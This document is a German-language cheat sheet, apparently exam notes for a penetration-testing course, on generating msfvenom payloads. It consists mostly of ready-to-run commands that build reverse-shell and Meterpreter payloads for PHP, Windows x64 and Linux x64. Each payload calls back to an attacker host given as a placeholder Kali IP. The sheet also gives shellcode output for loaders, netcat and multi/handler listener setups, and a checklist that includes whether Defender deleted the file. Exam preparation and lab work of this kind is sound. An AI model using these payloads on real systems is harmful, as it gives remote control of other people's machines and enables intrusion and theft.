# 💣 msfvenom — nur prüfungsrelevante Payloads

> Vor Generierung immer **Ziel-OS, Architektur, Payload-Typ und Listener** festlegen. Der Listener muss exakt zum staged/stageless Payload passen. Für Modulwahl, `multi/handler` und Sessions siehe [Metasploit-Anleitung](./metasploit.md).

## 1. Variablen

```bash
export LHOST=<KALI-IP>
export LPORT=4444
```

Ziel prüfen:

```text
Windows oder Linux?
x64 oder x86?
Webserver-Sprache: PHP/ASPX/JSP?
Darf Datei ausgeführt werden oder wird nur Shellcode benötigt?
```

## 2. Web/PHP

```bash
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rev.php
```

Listener:

```bash
nc -lvnp $LPORT
```

Bei Upload zuerst kleine Webshell (`id`/`whoami`) testen; dann Reverse Shell.

## 3. Windows x64

```bash
# Stageless normale Shell; oft mit nc möglich
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

# Stageless Meterpreter; multi/handler verwenden
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o meterpreter.exe
```

## 4. Linux x64

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
chmod +x shell.elf
```

## 5. Shellcode für einen vorhandenen Loader

```bash
# C-Array
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f c

# Raw Bytes
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin
```

`-f c` nur in C-Loader kopieren; `-f raw` benötigt ebenfalls einen passenden Loader und wird nicht direkt als EXE ausgeführt.

## 6. Staged vs. stageless

| Payload-Name | Typ | Listener |
|---|---|---|
| `windows/x64/shell_reverse_tcp` | stageless Shell | `nc` oder exakt konfigurierter handler |
| `windows/x64/shell/reverse_tcp` | staged Shell | Metasploit `multi/handler` |
| `windows/x64/meterpreter_reverse_tcp` | stageless Meterpreter | `multi/handler` |
| `windows/x64/meterpreter/reverse_tcp` | staged Meterpreter | `multi/handler` |

Merkregel:

```text
Slash vor reverse_tcp:     shell/reverse_tcp       → staged
Unterstrich:               shell_reverse_tcp       → stageless
Meterpreter braucht immer Metasploit als Listener.
```

## 7. Passender multi/handler

```bash
msfconsole -q
```

```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST <KALI-IP>
set LPORT 4444
set ExitOnSession false
run
```

Payload im Handler **exakt** so setzen wie bei `msfvenom`.

## 8. Wenn Metasploit-Exploit falschen Payload wählt

```text
show targets
show payloads
set TARGET <PASSENDES_ZIEL>
set payload <WINDOWS-ODER-LINUX>/<X64-ODER-X86>/<PAYLOAD>
set LHOST <KALI-IP>
set LPORT <PORT>
run
```

> **Hinweis Prof:** Eine Anwendung kann auf einem anderen OS laufen als der Standard-Payload des Exploits. Nicht nur Produkt, sondern Ziel-OS und Architektur prüfen.

## 9. Schnellkontrolle bei Fehlern

```bash
file shell.exe
file shell.elf
ss -lntp | grep $LPORT
ip -br a
```

Checkliste:

```text
□ LHOST ist die vom Ziel erreichbare Kali-/VPN-IP
□ LPORT stimmt in Payload und Listener überein
□ OS und Architektur stimmen
□ staged/stageless stimmt mit Listener überein
□ Datei wurde vollständig übertragen und nicht vom Defender entfernt
```
